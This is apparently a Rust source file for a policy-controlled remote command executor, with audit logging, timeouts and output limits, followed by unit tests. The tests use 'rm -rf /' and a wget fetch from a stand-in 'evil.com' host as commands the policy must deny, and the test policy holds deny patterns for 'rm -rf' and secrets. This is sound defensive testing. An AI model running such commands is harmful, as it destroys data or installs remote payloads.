//! Command execution with policy enforcement, timeout, and output limiting.

use std::sync::Arc;
use std::time::Instant;

use chrono::Utc;
use tokio::process::Command;
use tokio::sync::RwLock;
use tokio::time::{Duration, timeout};

use rf_audit::logger::AuditLogger;
use rf_audit::types::AuditEntry;
use rf_policy::rpc_policy::RpcPolicy;
use rf_rpc::types::{Action, Request, Response, RpcResult};

/// Executor handles RPC requests under policy control.
pub struct Executor {
    policy: Arc<RwLock<RpcPolicy>>,
    audit: Arc<dyn AuditLogger>,
    caller_key: String,
    agent_id: String,
    start_time: Instant,
}

impl Executor {
    pub fn new(
        policy: Arc<RwLock<RpcPolicy>>,
        audit: Arc<dyn AuditLogger>,
        caller_key: String,
    ) -> Self {
        Self {
            policy,
            audit,
            caller_key,
            agent_id: String::new(),
            start_time: Instant::now(),
        }
    }

    /// Set the agent ID for status reporting.
    pub fn with_agent_id(mut self, id: String) -> Self {
        self.agent_id = id;
        self
    }

    /// Set the start time for uptime calculation.
    pub fn with_start_time(mut self, start: Instant) -> Self {
        self.start_time = start;
        self
    }

    /// Handle an incoming RPC request.
    pub async fn handle(&self, request: Request) -> Response {
        let start = Instant::now();

        let result = match &request.action {
            Action::Execute {
                command,
                env,
                workdir,
            } => {
                self.handle_execute(&request.id, command, env, workdir, start)
                    .await
            }
            Action::Metrics => self.handle_metrics().await,
            Action::Status => self.handle_status(),
            _ => RpcResult::Error {
                message: "action not yet implemented".into(),
            },
        };

        Response {
            id: request.id,
            result,
        }
    }

    async fn handle_execute(
        &self,
        request_id: &str,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
        start: Instant,
    ) -> RpcResult {
        let policy = self.policy.read().await;

        // Policy check
        let decision = policy.check_command(command);
        let duration_ms = start.elapsed().as_millis() as u64;

        if !decision.allowed {
            if let Err(e) = self.audit.log(AuditEntry {
                timestamp: Utc::now(),
                request_id: request_id.to_string(),
                action: "execute".into(),
                command: Some(command.to_string()),
                decision: "denied".into(),
                matched_rule: decision.matched_rule.clone(),
                exit_code: None,
                duration_ms,
                caller_key: self.caller_key.clone(),
            }) {
                tracing::error!("audit log write failed: {}", e);
            }

            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }

        // Execute with timeout
        let timeout_dur = Duration::from_secs(policy.timeout_seconds as u64);
        let max_output = policy.max_output_bytes as usize;
        drop(policy); // Release read lock before spawning

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(command);

        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }

        for (k, v) in env {
            cmd.env(k, v);
        }

        let output = match timeout(timeout_dur, cmd.output()).await {
            Ok(Ok(output)) => output,
            Ok(Err(e)) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {}", e),
                };
            }
            Err(_) => {
                return RpcResult::Error {
                    message: format!("timeout after {}s", timeout_dur.as_secs()),
                };
            }
        };

        let stdout = String::from_utf8_lossy(&output.stdout[..output.stdout.len().min(max_output)])
            .to_string();
        let stderr = String::from_utf8_lossy(&output.stderr[..output.stderr.len().min(max_output)])
            .to_string();
        let exit_code = output.status.code().unwrap_or(-1);
        let duration_ms = start.elapsed().as_millis() as u64;

        if let Err(e) = self.audit.log(AuditEntry {
            timestamp: Utc::now(),
            request_id: request_id.to_string(),
            action: "execute".into(),
            command: Some(command.to_string()),
            decision: "allowed".into(),
            matched_rule: decision.matched_rule,
            exit_code: Some(exit_code),
            duration_ms,
            caller_key: self.caller_key.clone(),
        }) {
            tracing::error!("audit log write failed: {}", e);
        }

        RpcResult::Success {
            stdout,
            stderr,
            exit_code,
            duration_ms,
        }
    }

    async fn handle_metrics(&self) -> RpcResult {
        let info = sysinfo::System::new_all();
        let stdout = format!(
            "{{\"hostname\":\"{}\",\"cpus\":{},\"memory_total_mb\":{},\"memory_used_mb\":{}}}",
            sysinfo::System::host_name().unwrap_or_default(),
            info.cpus().len(),
            info.total_memory() / 1024 / 1024,
            info.used_memory() / 1024 / 1024,
        );

        RpcResult::Success {
            stdout,
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_status(&self) -> RpcResult {
        RpcResult::StatusInfo {
            agent_id: self.agent_id.clone(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            uptime_seconds: self.start_time.elapsed().as_secs(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rf_audit::logger::AuditLogger;
    use rf_audit::types::AuditEntry;
    use std::sync::Mutex;

    /// In-memory audit logger for testing.
    struct TestAuditLogger {
        entries: Mutex<Vec<AuditEntry>>,
    }

    impl TestAuditLogger {
        fn new() -> Self {
            Self {
                entries: Mutex::new(Vec::new()),
            }
        }

        fn entries(&self) -> Vec<AuditEntry> {
            self.entries.lock().unwrap().clone()
        }
    }

    impl AuditLogger for TestAuditLogger {
        fn log(&self, entry: AuditEntry) -> Result<(), rf_audit::logger::AuditError> {
            self.entries.lock().unwrap().push(entry);
            Ok(())
        }
    }

    fn test_policy() -> RpcPolicy {
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: "^echo .*"
      - pattern: "^cat /tmp/.*"
      - pattern: "^true$"
      - pattern: "^false$"
      - pattern: "^sleep .*"
    deny:
      - pattern: ".*rm.*-rf.*"
      - pattern: ".*secret.*"
  resources:
    maxOutputBytes: 1024
    timeoutSeconds: 2
"#;
        RpcPolicy::from_yaml(yaml).unwrap()
    }

    fn make_executor(audit: Arc<dyn AuditLogger>) -> Executor {
        let policy = Arc::new(RwLock::new(test_policy()));
        Executor::new(policy, audit, "test-caller-key".into())
    }

    #[tokio::test]
    async fn test_execute_allowed_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-1".into(),
            action: Action::Execute {
                command: "echo hello world".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-1");

        if let RpcResult::Success {
            stdout, exit_code, ..
        } = &resp.result
        {
            assert_eq!(stdout.trim(), "hello world");
            assert_eq!(*exit_code, 0);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }

        // Verify audit entry
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "allowed");
    }

    #[tokio::test]
    async fn test_execute_denied_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-2".into(),
            action: Action::Execute {
                command: "rm -rf /".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-2");

        if let RpcResult::Denied { reason, rule } = &resp.result {
            assert!(reason.contains("deny rule"));
            assert!(rule.contains("rm.*-rf"));
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }

        // Verify audit entry records denial
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "denied");
    }

    #[tokio::test]
    async fn test_execute_default_deny() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-3".into(),
            action: Action::Execute {
                command: "wget http://evil.com/malware".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Denied { reason, .. } = &resp.result {
            assert!(reason.contains("deny-by-default"));
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_nonzero_exit_code() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-4".into(),
            action: Action::Execute {
                command: "false".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { exit_code, .. } = &resp.result {
            assert_ne!(*exit_code, 0);
        } else {
            panic!("expected success with non-zero exit, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_timeout() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-5".into(),
            action: Action::Execute {
                command: "sleep 10".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Error { message } = &resp.result {
            assert!(message.contains("timeout"));
        } else {
            panic!("expected timeout error, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_output_limiting() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Generate output larger than maxOutputBytes (1024)
        let req = Request {
            id: "req-6".into(),
            action: Action::Execute {
                command: "echo $(head -c 2048 /dev/zero | tr '\\0' 'A')".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.len() <= 1024);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_with_env() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let mut env = std::collections::HashMap::new();
        env.insert("MY_VAR".into(), "test_value".into());

        let req = Request {
            id: "req-7".into(),
            action: Action::Execute {
                command: "echo $MY_VAR".into(),
                env,
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert_eq!(stdout.trim(), "test_value");
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_metrics_action() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-8".into(),
            action: Action::Metrics,
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.contains("cpus"));
            assert!(stdout.contains("memory_total_mb"));
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_unimplemented_action() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-9".into(),
            action: Action::Read {
                path: "/etc/hostname".into(),
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Error { message } = &resp.result {
            assert!(message.contains("not yet implemented"));
        } else {
            panic!("expected error, got {:?}", resp.result);
        }
    }
}
